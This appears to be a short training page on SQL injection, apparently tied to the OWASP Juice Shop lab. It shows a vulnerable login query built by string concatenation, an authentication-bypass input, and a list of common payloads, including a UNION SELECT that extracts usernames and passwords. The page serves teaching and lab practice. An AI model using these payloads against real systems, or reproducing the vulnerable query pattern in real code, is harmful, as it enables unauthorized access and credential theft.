A3: SQL Injection

Exploiting database queries to bypass authentication and extract data

What is SQL Injection?

SQL Injection is a code injection technique that exploits vulnerabilities in the way applications construct database queries. Attackers can insert malicious SQL statements that can read, modify, or delete data from the database.
Authentication Bypass
Using SQL injection to log in without valid credentials
Data Extraction
Using UNION attacks to extract data from database tables

Exploitation Example

Vulnerable Code
const query = "SELECT * FROM users WHERE
email = '" + email + "' AND
password = '" + password + "'";
Attack Input
Email: admin@juice-sh.op'--
Password: anything
Common SQL Injection Payloads
' OR 1=1--
' UNION SELECT username,password FROM users--
admin'--
CTF Challenge
